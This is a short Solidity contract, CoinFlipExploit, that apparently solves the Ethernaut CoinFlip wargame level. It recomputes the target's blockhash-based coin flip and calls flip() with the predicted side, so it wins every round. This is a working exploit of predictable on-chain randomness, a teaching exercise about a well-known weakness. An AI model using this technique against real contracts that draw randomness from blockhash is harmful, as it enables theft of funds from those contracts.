// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IFlip {
    function count() external view returns (uint);
    function flip(bool) external;
}

contract CoinFlipExploit {

    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 public blockValue;
    bool public side;
    address public targetAddr;

    function setTargetAddr(address _targetAddr) public payable {
       targetAddr = _targetAddr;
    }

    function flipExploit() public {
      blockValue = uint256(blockhash(block.number - 1));

      if (lastHash == blockValue) {
        revert();
      }

      lastHash = blockValue;
      uint256 coinFlip = blockValue / FACTOR;


      side = coinFlip == 1 ? true : false;
      IFlip(targetAddr).flip(side);
    }
}